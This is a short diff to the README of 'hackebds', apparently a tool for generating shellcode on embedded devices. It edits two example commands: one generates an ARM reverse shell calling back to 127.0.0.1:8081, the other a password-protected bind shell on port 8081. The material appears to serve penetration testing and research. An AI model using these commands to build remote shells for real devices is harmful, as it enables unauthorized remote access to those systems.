@@ -70,7 +70,7 @@ ubuntu（debian）
  ![image-20221206180431454](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221206180431454.png)
 
    ```
-   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode -passwd 1231
+   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode
    ```
 
    ![image-20221102181217933](https://img-blog.csdnimg.cn/img_convert/8571f33df56a35983e368c777141ad54.png)
@@ -80,7 +80,7 @@ ubuntu（debian）
    ![image-20221102183017775](https://img-blog.csdnimg.cn/img_convert/660574b30d7ae810cc7b0d96a3a60bd2.png)
 
    ```
-   hackebds -reverse_ip 0.0.0.0 -reverse_port 8081 -arch armelv7 -res bind_shell -passwd 1231
+   hackebds -bind_port 8081 -arch armelv7 -res bind_shell -passwd 1231
    ```
    ![image-20221102182939434](https://img-blog.csdnimg.cn/img_convert/05ebc0b42efcb42f58eef4815b3b08dc.png)
 
